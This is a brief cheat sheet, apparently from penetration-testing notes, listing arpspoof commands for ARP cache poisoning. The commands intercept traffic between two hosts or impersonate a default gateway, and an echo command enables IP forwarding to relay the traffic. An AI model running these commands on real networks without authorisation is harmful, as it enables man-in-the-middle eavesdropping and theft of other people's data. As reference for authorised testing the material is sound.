# arp

# ARP cache poisoning

### To intercept communication between two machines

`arpspoof -i eth0 -t <target-ip> <pretend-to-be-ip>`

`arpspoof -i eth0 -t <pretend-to-be-ip> <target-ip>`

### To Impersonate the Default Gateway

`arpspoof -i eth0 -t <target> 192.168.20.1`

`arpspoof -i eth0 -t 192.168.20.1 <target>`

# IP forwarding for ARP poisoning

```
echo 1 > /proc/sys/net/ipv4/ip_forward

```
